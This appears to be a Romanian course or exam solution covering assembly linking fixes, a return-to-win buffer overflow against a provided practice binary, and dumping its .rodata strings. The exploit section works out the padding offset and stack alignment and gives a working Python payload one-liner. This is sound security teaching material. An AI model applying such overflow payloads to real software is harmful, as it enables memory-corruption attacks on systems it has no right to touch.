# Subiectul 3 — linking + interpretare de binar

Subiectul are două părți distincte:
- **a)** lucrezi cu `file1.asm` + `file2.asm` (care, prin `Makefile`, produc binarul `file`);
- **b), c)** lucrezi cu binarul **precompilat `main`** din folder (un binar dat, separat de file1/file2).

Unelte folosite: `nasm`, `gcc`, `objdump`, `readelf`, `strings`, `python3`.

---

## a) Rezolvați erorile de compilare de la `make`

Rulând `make` pe scheletul dat:

```
file1.asm:9: error: symbol `add_and_print' not defined
```

### Cauza
Codul e împărțit în două fișiere, dar simbolurile partajate **nu sunt declarate**:
- `file1.asm` apelează `add_and_print`, definită în `file2.asm` → trebuie `extern`.
- `file1.asm` definește `fmt_result`, folosită în `file2.asm` → trebuie `global` aici și `extern` dincolo.
- `add_and_print` (din `file2.asm`) e apelată din `file1.asm` → trebuie `global`.
- `main` trebuie să fie `global` ca să fie găsită de linker drept punct de intrare.

### Rezolvarea (doar directive, NU modific codul funcțiilor)

Cerinta zice „nu puteți modifica codul funcțiilor”. Directivele `global`/`extern`
nu sunt cod de funcție, sunt declarații de simbol — deci se pot adăuga.

În `file1.asm`, înainte de `section .data`:

```nasm
global main
extern add_and_print
global fmt_result
```

În `file2.asm`, lângă `section .text`:

```nasm
global add_and_print
extern fmt_result
```

### Verificare

```sh
make
```

Acum `make` se compilează și linkează fără erori (asta cere subpunctul a:
„rezolvați erorile de compilare”).

> Notă: programul calculează `10 + 32` și e menit să afișeze `Result: 42`. Așa cum
> e dat, `main` nu-și pregătește cadrul de stivă (nu are `push rbp`), deci stiva e
> nealiniată la 16 octeți când se ajunge la `printf` → la rulare dă segfault pe
> `movaps`. Cum acest detaliu ține de *codul funcției* `main` (pe care nu avem voie
> să-l modificăm), subpunctul a se limitează la a face `make` să treacă. Cu un
> `push rbp` / `mov rbp, rsp` în `main`, binarul afișează corect `Result: 42`.

---

## b) Rulați `main` astfel încât să afișeze „Congratulations!”

Binarul `main` este un program *vulnerabil* clasic (return-to-win).

### Recunoaștere
```sh
strings main            # apare "Congratulations!", "Enter your name: ", "Hello, %s!"
objdump -d -M intel main
```

Din dezasamblare:
- `main` → cheamă doar `vuln`, apoi return. Nu cheamă niciodată funcția `win`.
- `vuln` face `fgets(buf, 0x40, stdin)` unde `buf = [rbp-0x20]` (**32 octeți**), dar
  citește până la **64** octeți → **buffer overflow** pe stivă.
- Există funcția `win` la adresa `0x401176` care face `puts("Congratulations!")`,
  dar e *moartă* (nu o apelează nimeni).

```nasm
0000000000401176 <win>:        ; puts("Congratulations!")
0000000000401190 <vuln>:
  401198: sub rsp, 0x20        ; buffer de 32 octeti la [rbp-0x20]
  4011bb: mov esi, 0x40        ; fgets citeste pana la 64 octeti  -> overflow
```

### Exploit (return-to-win)
Trebuie să suprascriem adresa de retur a lui `vuln` cu adresa lui `win`.

Layout-ul stivei în `vuln` (de la buffer în sus):
```
[rbp-0x20] ... buffer (32 octeti)
[rbp]          rbp salvat       (8 octeti)
[rbp+8]        adresa de retur   <- aici scriem adresa lui win
```
Deci **padding = 32 + 8 = 40 octeți**, apoi adresa lui `win`.

**Aliniere:** dacă sărim direct la `win` (`0x401176`), `puts` crapă pe `movaps`
fiindcă stiva nu e aliniată la 16. Soluția standard: sărim peste `push rbp` din
prologul lui `win`, adică la **`0x40117b`** (după `endbr64` + `push rbp`), ceea ce
corectează alinierea.

```sh
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + (0x40117b).to_bytes(8,'little'))" | ./main
```

Ieșire:
```
Enter your name: Hello, AAAAAAAA...AAAA{@!
Congratulations!
```

> Adresa lui `win` și offset-ul de 40 se obțin din `objdump -d main` (adresa `win`
> și `sub rsp, 0x20` din `vuln`). Alternativ la sărirea peste `push rbp`, se poate
> pune înainte un „ret gadget” (adresa unui `ret`) ca să se reașeze alinierea.

---

## c) Afișați doar șirurile din secțiunea `.rodata` a lui `main`

Cea mai curată comandă (afișează *doar* șirurile de caractere din secțiune):

```sh
readelf -p .rodata main
```

Ieșire:
```
String dump of section '.rodata':
  [     4]  Congratulations!
  [    15]  Enter your name:
  [    27]  Hello, %s!\n
```

Variante echivalente:
```sh
objdump -s -j .rodata main      # hexdump + ASCII al secțiunii
strings -t x main               # toate sirurile (nu doar .rodata)
```
